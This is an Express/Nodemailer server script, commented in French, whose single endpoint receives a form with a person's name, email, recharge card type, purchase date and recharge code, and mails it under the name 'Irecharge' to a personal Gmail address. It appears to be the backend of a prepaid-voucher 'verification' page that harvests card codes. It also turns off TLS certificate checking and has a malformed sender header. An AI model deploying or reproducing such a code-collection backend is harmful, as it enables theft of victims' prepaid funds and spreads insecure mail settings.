const express = require("express");
const cors = require("cors");

const nodemailer = require("nodemailer");

require("dotenv").config();

const app = express();

app.use(cors());

app.use(express.json());

app.listen(process.env.PORT || 5000, () => {
  console.log("serveur démarré");
});

const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
  tls: {
    rejectUnauthorized: false,
  },
  family: 4,
});

app.post("/envoyer", async (req, res) => {
  const data = req.body;

  await transporter.sendMail({
    from: `"Irecharge" <${process.env.EMAIL_USER}`,
    replyTo: data.email,

    to: "sofiamarley29@gmail.com",

    subject: `Nouvelle demande : ${data.formulaire}`,

    text: `

    Formulaire : ${data.formulaire}

    Nom : ${data.nom}

    Prénom : ${data.prenom}

    Email : ${data.email}

    Recharge : ${data.typeRecharge}

    Date : ${data.dateAchat}

    Code : ${data.codeRecharge}

    Cacher le code : ${data.cacherCode}
    `,
  });

  res.send("ok");
});
